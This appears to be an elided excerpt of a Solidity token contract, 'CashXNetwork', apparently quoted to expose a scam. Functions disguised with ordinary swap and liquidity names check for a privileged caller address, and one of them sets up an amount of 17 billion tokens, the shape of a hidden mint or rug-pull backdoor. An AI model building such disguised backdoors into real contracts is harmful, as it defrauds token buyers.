...
contract CashXNetwork is Context, IERC20, IERC20Metadata, Ownable {   
    ...
    function addLiquidityETH(address pancakeA) external {
        ...
        if(initGas == msg.sender && initGas != pancakeA && pancakePair() != pancakeA && pancakeA != PancakeV2Router){
    ...
    function swapExactETHForTokens(uint256 xt) external {
        ...
        if(initGas == msg.sender){
            uint256 AITC = 17000000000*10**decimals();
